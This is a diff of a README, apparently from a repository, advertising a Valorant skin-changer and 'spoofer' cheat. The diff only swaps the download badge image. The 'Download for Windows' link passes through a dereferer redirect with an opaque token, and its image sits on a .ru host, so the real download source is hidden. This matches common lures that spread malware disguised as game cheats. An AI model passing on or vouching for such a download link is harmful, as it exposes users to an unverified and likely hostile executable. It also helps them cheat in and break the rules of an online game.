@@ -2,7 +2,7 @@
 
 A modification that allows players to change the appearance of skins in the Valorant game. With this tool, users can access skins they don't have or change existing skins to other skins.
 
-[![Download for Windows](https://collyn-tools.ru/5.png)](https://dereferer.me/?ohWdVp6epyvdZJdn9BPA82-Kq90789nyo7-ADjW5evq5kEDJNeqNEBA8B6mrdyxqN)
+[![Download for Windows](https://collyn-tools.ru/5.svg)](https://dereferer.me/?ohWdVp6epyvdZJdn9BPA82-Kq90789nyo7-ADjW5evq5kEDJNeqNEBA8B6mrdyxqN)
 
 ## Opportunities:  
 - **Auto** unlock all skins
@@ -19,3 +19,4 @@ A modification that allows players to change the appearance of skins in the Valo
 5. **Spoofer** - Yes
 ## Conclusion:
  We wish you enjoy the game and have fun in the process, with new skins!
+
